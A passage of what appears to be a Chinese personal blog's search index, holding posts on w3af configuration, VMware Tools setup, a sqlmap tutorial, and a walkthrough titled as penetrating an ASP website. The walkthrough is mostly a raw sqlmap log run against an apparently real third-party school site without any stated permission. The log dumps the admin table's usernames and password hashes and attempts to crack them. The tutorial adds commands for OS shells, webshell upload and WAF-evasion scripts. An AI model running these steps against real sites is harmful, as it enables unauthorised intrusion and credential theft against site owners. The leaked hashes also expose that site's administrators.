follow_regex | .* | | When crawling only follow which that match this regular expression. Please note that ignore_regex || | | | has precedence over follow_regex. ||----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/crawl/config:web_spider&gt;&gt;&gt; set only_forward truew3af/plugins/crawl/config:web_spider&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; target w3af/config:target&gt;&gt;&gt; set target http://www.dvssc.com/dvwa/index.phpw3af/config:target&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; output Unknown command &apos;output&apos;w3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; output|----------------------------------------------------------------------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------------------------------------------------------------------|| console | Enabled | Yes | Print messages to the console. || csv_file | | Yes | Export identified vulnerabilities to a CSV file. || email_report | | Yes | Email report to specified addresses. || export_requests | | Yes | Export the fuzzable requests found during crawl to a file. || html_file | | Yes | Generate HTML report with identified vulnerabilities and log messages. || text_file | | Yes | Prints all messages to a text file. || xml_file | | Yes | Print all messages to a xml file. ||----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; output html_filew3af/plugins&gt;&gt;&gt; output config html_filew3af/plugins/output/config:html_file&gt;&gt;&gt; view|----------------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------------------------------------------------------------|| output_file | ~/report.html | | File name where this plugin will write to || verbose | False | | True if debug information will be appended to the || | | | report. || template | w3af/plugins/output/html_file/templates/complete.html | | The path to the HTML template used to render the || | | | report. ||----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/output/config:html_file&gt;&gt;&gt; set output_file lixu.phpw3af/plugins/output/config:html_file&gt;&gt;&gt; set verbose truew3af/plugins/output/config:html_file&gt;&gt;&gt; view |----------------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------------------------------------------------------------|| output_file | lixu.php | Yes | File name where this plugin will write to || verbose | true | Yes | True if debug information will be appended to the || | | | report. || template | w3af/plugins/output/html_file/templates/complete.html | | The path to the HTML template used to render the || | | | report. ||----------------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/output/config:html_file&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; start#到此为止，如果配置正确就能够对目标网站进行测试，直接图形化界面吧，方便","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"KALI","slug":"KALI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/KALI/"},{"name":"W3AF","slug":"W3AF","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/W3AF/"}]},{"title":"VMware tools安装","slug":"VMware-tools安装","date":"2019-01-13T22:18:51.000Z","updated":"2019-01-13T22:19:42.798Z","comments":true,"path":"2019/01/14/VMware-tools安装/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/VMware-tools安装/","excerpt":"","text":"如何安装上VMware tools使自己的虚拟机用起来舒畅 1.打开VMware Tools安装 2.使用cd ls 等命令得到压缩包文件 3.命令：tar zxvf +压缩文件得到解压文件 4.命令：rm –r +压缩文件（强制删除文件） 5.打开解压文件 6.命令：./vmware-install.pl 7.一路绿灯即可","categories":[{"name":"系统及软件配置","slug":"system-software","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/system-software/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Linux/"},{"name":"VMware Tools","slug":"VMware-Tools","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/VMware-Tools/"}]},{"title":"通过kali渗透ASP网站","slug":"通过kali渗透ASP网站","date":"2019-01-13T22:16:54.000Z","updated":"2019-01-13T22:17:27.970Z","comments":true,"path":"2019/01/14/通过kali渗透ASP网站/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/通过kali渗透ASP网站/","excerpt":"","text":"通过kali渗透ASP网站 1.打开终端输入 sqlmap -u &quot;网址&quot; ———————————————————————————————————————————————————————————————————————————————————————— root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; _ ___ ___| |_____ ___ ___ {1.0-dev-nongit-201707310a89} |_ -| . | | | .&apos;| . | |___|_ |_|_|_|_|__,| _| |_| |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting at 10:31:49 [10:31:50] [INFO] testing connection to the target URL [10:31:52] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS [10:31:56] [INFO] testing if the target URL is stable [10:31:59] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user&apos;s manual paragraph &apos;Page comparison&apos; and provide a string or regular expression to match on how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c [10:32:33] [INFO] testing if GET parameter &apos;ID&apos; is dynamic [10:32:33] [INFO] confirming that GET parameter &apos;ID&apos; is dynamic [10:32:33] [INFO] GET parameter &apos;ID&apos; is dynamic [10:32:37] [INFO] heuristic (basic) test shows that GET parameter &apos;ID&apos; might be injectable [10:32:37] [INFO] testing for SQL injection on GET parameter &apos;ID&apos; [10:32:37] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos; [10:32:38] [WARNING] reflective value(s) found and filtering out [10:32:42] [INFO] GET parameter &apos;ID&apos; seems to be &apos;AND boolean-based blind - WHERE or HAVING clause&apos; injectable [10:32:42] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&apos; [10:32:42] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos; [10:32:43] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause&apos; [10:32:43] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos; [10:32:44] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace&apos; [10:32:44] [INFO] testing &apos;MySQL inline queries&apos; [10:32:44] [INFO] testing &apos;PostgreSQL inline queries&apos; [10:32:45] [INFO] testing &apos;Microsoft SQL Server/Sybase inline queries&apos; [10:32:45] [INFO] testing &apos;MySQL &gt; 5.0.11 stacked queries (SELECT - comment)&apos; [10:32:45] [WARNING] time-based comparison requires larger statistical model, please wait............ [10:33:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option &apos;--time-sec&apos; as possible (e.g. 10 or more) [10:33:19] [INFO] testing &apos;PostgreSQL &gt; 8.1 stacked queries (comment)&apos; [10:33:19] [INFO] testing &apos;Microsoft SQL Server/Sybase stacked queries (comment)&apos; [10:33:20] [INFO] testing &apos;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&apos; [10:33:21] [INFO] testing &apos;MySQL &gt;= 5.0.12 AND time-based blind (SELECT)&apos; [10:33:21] [INFO] testing &apos;PostgreSQL &gt; 8.1 AND time-based blind&apos; [10:33:22] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind&apos; [10:33:22] [INFO] testing &apos;Oracle AND time-based blind&apos; [10:33:22] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 20 columns&apos; [10:33:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option &apos;--dbms&apos; [10:33:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [10:33:33] [INFO] testing &apos;MySQL UNION query (NULL) - 1 to 20 columns&apos; [10:33:44] [INFO] checking if the injection point on GET parameter &apos;ID&apos; is a false positive GET parameter &apos;ID&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests: --- Parameter: ID (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: ID=3239 AND 1305=1305 --- [10:37:45] [INFO] testing MySQL [10:37:46] [WARNING] the back-end DBMS is not MySQL [10:37:46] [INFO] testing Oracle [10:37:47] [WARNING] the back-end DBMS is not Oracle [10:37:47] [INFO] testing PostgreSQL [10:37:47] [WARNING] the back-end DBMS is not PostgreSQL [10:37:47] [INFO] testing Microsoft SQL Server [10:37:48] [WARNING] the back-end DBMS is not Microsoft SQL Server [10:37:48] [INFO] testing SQLite [10:37:48] [WARNING] the back-end DBMS is not SQLite [10:37:48] [INFO] testing Microsoft Access [10:37:51] [INFO] confirming Microsoft Access [10:37:53] [INFO] the back-end DBMS is Microsoft Access ------------------------------------------------------------------------------------ | web server operating system: Windows 2003 or XP | | web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727 | | back-end DBMS: Microsoft Access | ------------------------------------------------------------------------------------ [10:37:53] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 67 times [10:37:53] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos; [*] shutting down at 10:37:53 #### 如果有漏洞会返回数据库相关信息 2.猜解表名 sqlmap -u &quot;网址&quot; --tables root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --tables _ ___ ___| |_____ ___ ___ {1.0-dev-nongit-201707310a89} |_ -| . | | | .&apos;| . | |___|_ |_|_|_|_|__,| _| |_| |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting at 10:41:45 [10:41:45] [INFO] resuming back-end DBMS &apos;microsoft access&apos; [10:41:47] [INFO] testing connection to the target URL [10:41:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS sqlmap resumed the following injection point(s) from stored session: --- Parameter: ID (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: ID=3239 AND 1305=1305 --- [10:41:52] [INFO] the back-end DBMS is Microsoft Access web server operating system: Windows 2003 or XP web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727 back-end DBMS: Microsoft Access [10:41:52] [INFO] fetching tables for database: &apos;Microsoft_Access_masterdb&apos; [10:41:52] [INFO] fetching number of tables for database &apos;Microsoft_Access_masterdb&apos; [10:41:52] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval [10:41:52] [INFO] retrieved: [10:41:53] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; [10:41:53] [WARNING] unable to retrieve the number of tables for database &apos;Microsoft_Access_masterdb&apos; [10:41:53] [ERROR] cannot retrieve table names, back-end DBMS is Access do you want to use common table existence check? [Y/n/q] y // 此处默认选y [10:41:59] [INFO] checking table existence using items from &apos;/usr/share/sqlmap/txt/common-tables.txt&apos; [10:41:59] [INFO] adding words used on web page to the check list please enter number of threads? [Enter for 1 (current)] 10 // 线程设置为10即可 [10:42:06] [INFO] starting 10 threads [10:42:12] [INFO] retrieved: admin [10:42:13] [INFO] retrieved: news [10:42:38] [INFO] retrieved: ads Database: Microsoft_Access_masterdb [3 tables] +-------+ | admin | | ads | | news | +-------+ [10:45:43] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 3144 times [10:45:43] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos; [*] shutting down at 10:45:43 根据经验确定用户名（username，password） 3.猜解列名（字段） sqlmap -u &quot;网址&quot; --columns -T &quot;表名（上一步确定的）&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --columns -T &quot;admin&quot; _ ___ ___| |_____ ___ ___ &#123;1.0-dev-nongit-201707310a89&#125;|_ -| . | | | .&apos;| . ||___|_ |_|_|_|_|__,| _| |_| |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:07:47[11:07:48] [INFO] resuming back-end DBMS &apos;microsoft access&apos; [11:07:48] [INFO] testing connection to the target URL[11:07:50] [INFO] checking if the target is protected by some kind of WAF/IPS/IDSsqlmap resumed the following injection point(s) from stored session:---Parameter: ID (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: ID=3239 AND 1305=1305---[11:07:53] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft Access[11:07:53] [ERROR] cannot retrieve column names, back-end DBMS is Accessdo you want to use common column existence check? [Y/n/q] y[11:08:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; [11:08:00] [INFO] checking column existence using items from &apos;/usr/share/sqlmap/txt/common-columns.txt&apos;[11:08:00] [INFO] adding words used on web page to the check listplease enter number of threads? [Enter for 1 (current)] 20[11:08:02] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issuesplease enter number of threads? [Enter for 1 (current)] 10[11:08:05] [INFO] starting 10 threads[11:08:07] [INFO] retrieved: id [11:08:09] [INFO] retrieved: username [11:08:19] [INFO] retrieved: password [11:08:36] [INFO] retrieved: department [11:10:51] [INFO] retrieved: classid Database: Microsoft_Access_masterdbTable: admin[5 columns]+------------+-------------+| Column | Type |+------------+-------------+| classid | numeric || department | non-numeric || id | numeric || password | non-numeric || username | non-numeric |+------------+-------------+[11:11:11] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 2499 times[11:11:11] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;[*] shutting down at 11:11:11 #### --columns 猜列名 根据表 “表名” #### 一般会出现username，那么密码字段一定是password 4.下载数据 sqlmap -u &quot;网址&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --dump -C &quot;username,password&quot; _ ___ ___| |_____ ___ ___ &#123;1.0-dev-nongit-201707310a89&#125;|_ -| . | | | .&apos;| . ||___|_ |_|_|_|_|__,| _| |_| |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:13:17[11:13:17] [INFO] resuming back-end DBMS &apos;microsoft access&apos; [11:13:17] [INFO] testing connection to the target URL[11:13:19] [INFO] checking if the target is protected by some kind of WAF/IPS/IDSsqlmap resumed the following injection point(s) from stored session:---Parameter: ID (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: ID=3239 AND 1305=1305---[11:13:22] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft Access[11:13:22] [INFO] fetching tables for database: &apos;Microsoft_Access_masterdb&apos;[11:13:22] [INFO] fetching number of tables for database &apos;Microsoft_Access_masterdb&apos;[11:13:22] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval[11:13:22] [INFO] retrieved: [11:13:24] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; [11:13:24] [WARNING] unable to retrieve the number of tables for database &apos;Microsoft_Access_masterdb&apos;[11:13:24] [ERROR] cannot retrieve table names, back-end DBMS is Access[11:13:24] [ERROR] cannot retrieve column names, back-end DBMS is Access[11:13:24] [INFO] fetching entries of column(s) &apos;classid, department, id, password, username&apos; for table &apos;admin&apos; in database &apos;Microsoft_Access_masterdb&apos;[11:13:24] [INFO] fetching number of column(s) &apos;classid, department, id, password, username&apos; entries for table &apos;admin&apos; in database &apos;Microsoft_Access_masterdb&apos;[11:13:24] [INFO] retrieved: 2[11:13:31] [INFO] fetching number of distinct values for column &apos;id&apos;[11:13:31] [INFO] retrieved: 2[11:13:38] [INFO] using column &apos;id&apos; as a pivot for retrieving row data[11:13:38] [INFO] retrieved: 19[11:13:58] [INFO] retrieved: 1[11:14:08] [INFO] retrieved: 47CC749B63858A2CE72379B371ECFE33[11:19:28] [INFO] retrieved: admin[11:20:42] [INFO] retrieved: [11:21:58] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s) Q~\\xdc[11:24:50] [INFO] retrieved: 25[11:25:14] [INFO] retrieved: 2[11:25:28] [INFO] retrieved: 93EA4D217C79428D[11:28:17] [INFO] retrieved: xqb[11:28:56] [INFO] retrieved: Q~\\xdc[11:31:29] [INFO] analyzing table dump for possible password hashes[11:31:29] [INFO] recognized possible password hashes in column &apos;password&apos;do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y[11:31:43] [INFO] writing hashes to a temporary file &apos;/tmp/sqlmap1qoJgX17098/sqlmaphashes-NipaiC.txt&apos; do you want to crack them via a dictionary-based attack? [Y/n/q] y[11:31:51] [INFO] using hash method &apos;md5_generic_passwd&apos;[11:31:51] [INFO] using hash method &apos;mysql_old_passwd&apos;what dictionary do you want to use?[1] default dictionary file &apos;/usr/share/sqlmap/txt/wordlist.zip&apos; (press Enter)[2] custom dictionary file[3] file with list of dictionary files&gt; 1[11:32:01] [INFO] using default dictionarydo you want to use common password suffixes? (slow!) [y/N] y[11:32:11] [INFO] starting dictionary-based cracking (md5_generic_passwd)[11:32:11] [INFO] starting 4 processes [11:32:20] [INFO] using suffix &apos;1&apos; [11:32:30] [INFO] using suffix &apos;123&apos; [11:32:40] [INFO] using suffix &apos;2&apos; [11:32:49] [INFO] using suffix &apos;12&apos; [11:32:59] [INFO] using suffix &apos;3&apos; [11:33:08] [INFO] using suffix &apos;13&apos; [11:33:18] [INFO] using suffix &apos;7&apos; [11:33:28] [INFO] using suffix &apos;11&apos; [11:33:38] [INFO] using suffix &apos;5&apos; [11:33:47] [INFO] using suffix &apos;22&apos; [11:33:57] [INFO] using suffix &apos;23&apos; [11:34:06] [INFO] using suffix &apos;01&apos; [11:34:16] [INFO] using suffix &apos;4&apos; [11:34:26] [INFO] using suffix &apos;07&apos; [11:34:36] [INFO] using suffix &apos;21&apos; [11:34:46] [INFO] using suffix &apos;14&apos; [11:34:55] [INFO] using suffix &apos;10&apos; [11:35:05] [INFO] using suffix &apos;06&apos; [11:35:14] [INFO] using suffix &apos;08&apos; [11:35:24] [INFO] using suffix &apos;8&apos; [11:35:34] [INFO] using suffix &apos;15&apos; [11:35:44] [INFO] using suffix &apos;69&apos; [11:35:54] [INFO] using suffix &apos;16&apos; [11:36:03] [INFO] using suffix &apos;6&apos; [11:36:13] [INFO] using suffix &apos;18&apos; [11:36:22] [INFO] using suffix &apos;!&apos; [11:36:32] [INFO] using suffix &apos;.&apos; [11:36:43] [INFO] using suffix &apos;*&apos; [11:36:52] [INFO] using suffix &apos;!!&apos; [11:37:02] [INFO] using suffix &apos;?&apos; [11:37:13] [INFO] using suffix &apos;;&apos; [11:37:23] [INFO] using suffix &apos;..&apos; [11:37:33] [INFO] using suffix &apos;!!!&apos; [11:37:43] [INFO] using suffix &apos;, &apos; [11:37:53] [INFO] using suffix &apos;@&apos; [11:38:03] [INFO] starting dictionary-based cracking (mysql_old_passwd) [11:38:18] [INFO] using suffix &apos;1&apos; [11:38:35] [INFO] using suffix &apos;123&apos; [11:38:51] [INFO] using suffix &apos;2&apos; [11:39:07] [INFO] using suffix &apos;12&apos; [11:39:23] [INFO] using suffix &apos;3&apos; [11:39:38] [INFO] using suffix &apos;13&apos; [11:39:54] [INFO] using suffix &apos;7&apos; [11:40:10] [INFO] using suffix &apos;11&apos; [11:40:26] [INFO] using suffix &apos;5&apos; [11:40:41] [INFO] using suffix &apos;22&apos; [11:41:03] [INFO] using suffix &apos;23&apos; [11:41:24] [INFO] using suffix &apos;01&apos; [11:41:46] [INFO] using suffix &apos;4&apos; [11:42:07] [INFO] using suffix &apos;07&apos; [11:42:30] [INFO] using suffix &apos;21&apos; [11:42:52] [INFO] using suffix &apos;14&apos; [11:43:10] [INFO] using suffix &apos;10&apos; [11:43:32] [INFO] using suffix &apos;06&apos; [11:43:51] [INFO] using suffix &apos;08&apos; [11:44:07] [INFO] using suffix &apos;8&apos; [11:44:22] [INFO] using suffix &apos;15&apos; [11:44:37] [INFO] using suffix &apos;69&apos; [11:44:53] [INFO] using suffix &apos;16&apos; [11:45:10] [INFO] using suffix &apos;6&apos; [11:45:31] [INFO] using suffix &apos;18&apos; [11:45:56] [INFO] using suffix &apos;!&apos; [11:46:21] [INFO] using suffix &apos;.&apos; [11:46:46] [INFO] using suffix &apos;*&apos; [11:47:10] [INFO] using suffix &apos;!!&apos; [11:47:32] [INFO] using suffix &apos;?&apos; [11:47:54] [INFO] using suffix &apos;;&apos; [11:48:14] [INFO] using suffix &apos;..&apos; [11:48:35] [INFO] using suffix &apos;!!!&apos; [11:48:58] [INFO] using suffix &apos;, &apos; [11:49:18] [INFO] using suffix &apos;@&apos; [11:49:36] [WARNING] no clear password(s) found [11:49:36] [INFO] postprocessing table dumpDatabase: Microsoft_Access_masterdbTable: admin[2 entries]+----+---------+----------+------------+----------------------------------+| id | classid | username | department | password |+----+---------+----------+------------+----------------------------------+| 19 | 1 | admin | \\x7fQ~\\xdc | 47CC749B63858A2CE72379B371ECFE33 || 25 | 2 | xqb | \\x7fQ~\\xdc | 93EA4D217C79428D |+----+---------+----------+------------+----------------------------------+[11:49:36] [INFO] table &apos;Microsoft_Access_masterdb.admin&apos; dumped to CSV file &apos;/root/.sqlmap/output/40.cavtc.cn/dump/Microsoft_Access_masterdb/admin.csv&apos;[11:49:36] [ERROR] cannot retrieve column names, back-end DBMS is Access[11:49:36] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;news&apos; in database &apos;Microsoft_Access_masterdb&apos;[11:49:36] [INFO] fetching number of column(s) &apos;password, username&apos; entries for table &apos;news&apos; in database &apos;Microsoft_Access_masterdb&apos;[11:49:36] [INFO] retrieved: 127[11:49:56] [INFO] fetching number of distinct values for column &apos;password&apos;[11:49:56] [INFO] retrieved: [11:49:57] [INFO] fetching number of distinct values for column &apos;username&apos;[11:49:57] [INFO] retrieved: [11:49:58] [CRITICAL] all column name(s) provided are non-existent[11:49:58] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 74 times[*] shutting down at 11:49:58 #### --dump 下载数据 #### -C &quot;username,password&quot; -T &quot;列名&quot; （&apos;,&apos;是一种多列显示的方法） 5.成功获得用户名与密码(cmd5解密)","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"KALI","slug":"KALI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/KALI/"},{"name":"SQLMAP","slug":"SQLMAP","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/SQLMAP/"},{"name":"ASP","slug":"ASP","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ASP/"}]},{"title":"SQLAMP入门","slug":"SQLAMP入门","date":"2019-01-13T22:15:56.000Z","updated":"2019-01-13T22:16:38.754Z","comments":true,"path":"2019/01/14/SQLAMP入门/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/SQLAMP入门/","excerpt":"","text":"SQLAMP入门 1.什么是sqlmap sqlmap是一款命令行界面的开源的渗透测试工具（自动化的SQL注入） sqlmap可以自动化的侦测和实施SQL注入攻击及渗透数据库服务器 sqlmap有强大的侦测引擎，可以获取不同数据库的指纹信息、数据，能够处理潜在的文件系统及通过数据连接执行系统命令 2.sqlmap功能作用 sqlmap目前支持My是SQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase和SAP MaxDB等数据库类型，采用五种独特的数据库注入方式 基于bool的盲注，即可以根据返回页面判断条件真假的注入 基于time的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间内延迟 语句是否执行来判断（即页面返回时间是否增加） 基于error注入，即页面会返回错误信息，或者注入的语句的结果直接返回在页面中 联合查询union注入，可以使用union的情况下注入 堆查询注入，可以同时执行多条语句的注入 3.sqlmap安装环境 一个kali就搞定 其他环境安装（百度） 1.先准备好Python2.7环境 2.sqlmap安装包 4.三种请求类型的注入探测 GET方式 的SQL注入检测 sqlmap.py -u &quot;URL&quot; POST方式的SQL注入检测（火狐浏览器安装插件hackbar抓到包之后可以看到POST数据） sqlmap.py -u &quot;URL&quot; --data &quot;POST数据&quot; Cookie方式的SQL注入检测（火狐浏览器安装插件firebug，首先要使用该插件创建一个Cookie，Cookie的值为Cookie数据） sqlmap.py -u --cookie &quot;Cookie数据&quot; 4 获取数据库相关信息 获取数据库的数据库类型以及版本 数据库类型及版本 Microsoft SQL Server Mysql Orcle PostgreSQL 如何查看类型及版本 sqlmap.py -u &quot;URL&quot; 获取当前网站所使用的数据库名与用户名 两种常见的数据库结构（两种数据存储结构不同） Microsoft Access（库：表1，表2，表3） Microsoft SQL Server（库1：（表1，表2，表3），库2，库3） sqlmap.py -u &quot;URL&quot; --currrent-db //获取当前URL的数据库名 sqlmap.py -u &quot;URL&quot; --current-user //获取此数据库的用户名 5.获取数据量和用户权限 获取数据库的数据量 拿到了数据库但无法查看怎么办 sqlmap.py -u &quot;URL&quot; --count -D &quot;数据库名&quot; 判断用户的权限 最高权限：增删改查、写入读取文件、执行系统命令 sqlmap.py -u &quot;URL&quot; --privileges //查看用户权限 也可以通过查看数据库的用户名来判断权限 Microsoft SQL Server ：sa Mysql：root sqlmap.py -u &quot;URL&quot; --current-user 6.Mysql数据库的注入 Mysql数据库的结构 mysql数据库结构: ( 库1：（表，列，数据or字段内容）， 库2：（表，列，数据or字段内容）， 库3：（表，列，数据or字段内容） ) Mysql注入（四步） sqlmap.py -u &quot;URL&quot; --current-db //获取库名 sqlmap.py -u &quot;URL&quot; --tables-D &quot;数据库名&quot; //获取该库中的表名 sqlmap.py -u &quot;URL&quot; --columns-T &quot;表名&quot; //获取某个表名的列名 sqlmap.py -u &quot;URL&quot; --dump -C &quot;列名1(,列名2)&quot;-T &quot;表名&quot; //获取字段内容 思考：新的数据库注入 有两款新的数据库类型sqlmap不支持（使用NoSQLMap即可） MongoDB NoSQL 7.管理自己的数据库 如何随时链接自己的数据库 sqlmap.py -d &quot;mysql://用户名:密码@地址:端口/数据库名&quot; 例如： sqlmap.py -d &quot;mysql://root:root@localhost:3306/test&quot; //如果报错，那就是没有安装pymysql（百度） 管理自己的数据库 sqlmap.py -d &quot;mysql://root:root@localhost:3306/test&quot; --sql-shell 得到： sql-shell &gt; //等待输入，即可管理 8.延时注入 延时注入在什么情况下使用 在我们挖掘SQL注入漏洞的过程中，页面无变化，无法用bool真假判断，无法报错的情况下使用延时注入 最精准，耗时长 如何进行延时注入(二者均可) sqlmap.py -u &quot;URL&quot; --delay 数值（延时的秒数） sqlmap.py -u &quot;URL&quot; -safe-freq 9.交互式命令执行和写webshell 什么是交互式（必须是最高权限） 和数据库or “URL”网址的服务器，进行交互 SQLMAP进行命令执行（提权） sqlmap.py -u &quot;URL&quot; --os-cmd=&quot;命令&quot; //注意在是使用交互式参数时要知道网站的绝对路径，命令执行后设置中又一个需要你输入绝对路径： d:/www/ ，当我们执行命令是SQLMAP是创建了一个文件在绝对路径之下的，但是执行完之后就自动删除了 SQLMAP写webshell and （提权） sqlmap.py -u &quot;URL&quot; --os-shell //教程一路设置4----2---d:/www/----仅供参考 得到： os-shell &gt; 10.Tamper脚本的介绍和使用 What is Tamper? sqlmap目录下的tamper，里面的脚本有不同的功能来帮助我们使用sqlmap进行高级的SQL注入测试，如：绕过waf 小试Tamper脚本 常规办法（and 1=1）无法注入时 sqlmap.py -u &quot;URL&quot; --temper=&quot;randomcase.py&quot;(脚本名称) Tamper脚本总结 各种temper脚本用法 http://pan.baidu.com/s/1dF0ywFn 密码：jp29 10.本地写入webshell 什么是本地写入webshell 上传自己本地自定义的文件 本地写入webshell 在sqlmap目录下创建一个目录（mst）在目录下创建自己想要上传的文件 需要最高权限 需要两个参数 本地文件的(路径)地址 –file-write “./mst/mst.txt” 目标文件的(路径)地址 –file-dest “d:/www/1.html sqlmap.py -u “URL” –file-write “./mst/mst.txt” –file-dest “d:/www/1.html” 11.批量检测注入漏洞 你对批量知多少 将所有的链接写在一个txt文档中，批量检测 批量检测给你招 sqlmap.py -m g:\\ceshi\\test.txt(绝对路径) 结合BurpSuite进行批量 通过BurpSuite记录一些对网址的请求数据包，设置options– &gt; misc –&gt; Proxy中选中Request -&gt; 设置保存文件名（test.log），在浏览器中设置好代理，通过Proxy模块监听，之后在test.log中就会有记录 sqlmap.py -l g:\\ceshi\\test.log --batch -smart //--batch:自动选择yes；-smart:启发式快速判断；--level=(1-5) :要执行的探测水平等级;--risk=(0-3):测试执行的风险等级 探测等级：–level；共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads中看到，你也可以根据相应的格式自己添加payload。这个参数不仅影响之前使用的那些payload同事也会影响测试的注入点，GET和POST的数据都会测试，HTTP 